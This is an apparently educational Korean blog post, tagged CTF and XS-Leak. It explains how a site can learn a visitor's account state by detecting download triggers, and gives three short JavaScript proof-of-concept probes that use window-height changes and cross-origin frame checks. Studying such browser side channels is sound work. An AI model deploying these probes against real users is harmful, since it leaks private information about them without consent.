---
layout: post
date: 2021-08-16 00:00:11
title: "Cross-site leak with Download Trigger"
categories: CTF
tags: [XS-Leak]
author:
  - Jeongwon Jo

---
## Summary

XS-Leak이란 사용자 입력값을 기반으로 브라우저에 반환값을 이용해서 사용자 정보와 같은 중요한 데이터를 수집할 수 있는 취약점 입니다. 만약 xs-leak을 깊이 공부하고 싶으면 [여기](https://xsleaks.dev)를 통해 공부할 수 있습니다 :)

---
## What is Download Trigger?

![image](https://user-images.githubusercontent.com/49112423/129486098-81fcc315-0f12-4cd5-a414-e09bb8238e71.png)

엔드포인트에서 `Content-Disposition: attachment` 헤더가 설정이 되면 브라우저는 응답을 하는 대신에 다운로드 할 파일을 탐색한다고 합니다. 특정 상황에 따라서 사용자의 계정 상태 및 여러 요소들에 따라서 달라지는 경우를 이용해서 중요 정보를 수집할 수 있습니다.

![image](https://user-images.githubusercontent.com/49112423/129486089-6b3179ed-13c5-4545-b8cf-2e957797d8ca.png)
![image](https://user-images.githubusercontent.com/49112423/129486161-316cf985-49e8-4f94-aa13-567cd166e523.png)

Download Trigger 기법 중 첫 번째 방식은 크로니움 기반 브라우저에서 파일을 다운로드 하게 되면 위와 같이 브라우저 하단에 다운로드 한 파일의 미리 보기가 나타나는 것을 이용하는 것 입니다. 파일이 다운로드 될 때와, 다운로드가 되지 않을 때의 창 높낮이를 이용해서 정보를 유추하는 방식입니다. 

```js
var screenHeight = window.innerHeight;
window.open('https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip');

setTimeout(() => {
    if (window.innerHeight < screenHeight) {
      console.log('Download bar detected');
    } else {
      console.log('Download bar not detected');
    }
}, 2000);
```
POC는 위와 같습니다. 

![image](https://user-images.githubusercontent.com/49112423/129486249-b6607571-d727-4d57-b127-12556efa3d7c.png)

정상적으로 파일이 다운로드 되었을 때 입니다.

![image](https://user-images.githubusercontent.com/49112423/129486284-a012c229-51dd-4203-8697-3b9dfa912bcb.png)

파일이 다운로드 되지 않았을 때 입니다.

정상적으로 파일이 다운로드가 되었을 때는, 브라우저 하단에 생성된 창에 의해서 기본의 창에 크기보다 작아 졌기 때문에 다운로드 바가 탐지 되어 다고 출력이 되고, 되지 않았을 때는 창의 크기가 그대로이므로 다운로드 바가 탐지 되지 않았다고 출력 되는 것을 볼 수 있습니다. 

![image](https://user-images.githubusercontent.com/49112423/129486501-7caca57c-97ae-4eb2-a7fa-57f9c472bd1d.png)

두 번째 방식은 iframe을 이용해서 첨부 파일 탐색이 되었을 때, iframe이 교차 출처로 되는 것을 이용해서 판단하는 기법입니다. 

```js
var url = 'https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip';

var iframe = document.createElement('iframe');
document.body.appendChild(iframe);

iframe.srcdoc = `<iframe src="${url}" ></iframe>`;
iframe.onload = () => {
      try {
          iframe.contentWindow.frames[0].origin;
          console.log('Download attempt detected');
      } catch(e) {
          console.log('No download attempt detected');
      }
}
```
POC는 위와 같습니다. 

![image](https://user-images.githubusercontent.com/49112423/129486548-895bce61-2348-4f3b-aef6-bb4780540b1a.png)

세 번째 방식은 두 번째 방식은 원리는 동일 하지만 iframe을 사용하지 않고 트리거 하는 방식 입니다. 

```js
var url = 'https://example.org';
var win = window.open(url);

setTimeout(() => {
      try {
          // If a navigation occurs, the iframe will be cross-origin,
          // so accessing "win.origin" will throw an exception
          win.origin;
          parent.console.log('Download attempt detected');
      } catch(e) {
          parent.console.log('No download attempt detected');
      }
}, 2000);
```
POC는 위와 같습니다. 
